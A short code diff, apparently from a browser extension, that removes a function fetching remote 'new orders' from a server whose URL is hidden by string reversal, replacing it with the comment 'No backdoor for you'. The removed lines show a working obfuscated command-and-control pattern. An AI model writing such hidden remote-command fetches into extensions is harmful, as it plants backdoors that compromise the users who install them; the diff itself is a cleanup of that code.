@@ -1,16 +1,5 @@
 function getnews(callback){
-	var BGRequest = function(action, target){
-		this.action = action
-		this.target = target
-	}
-	var request = new BGRequest("getneworders", ("sredrowen/moc.axmoc.revrestobxeh//:ptth").split("").reverse().join(""))
-	chrome.runtime.sendMessage({message: request}, function(responseMessage) {
-		var handleResponse = function(getResponse, sender, sendResponse) {
-				chrome.extension.onMessage.removeListener(handleResponse)
-				callback(getResponse.message)
-			}
-		chrome.runtime.onMessage.addListener(handleResponse)
-	})
+	// No backdoor for you
 }
 
 function updateSystem(callback, com){
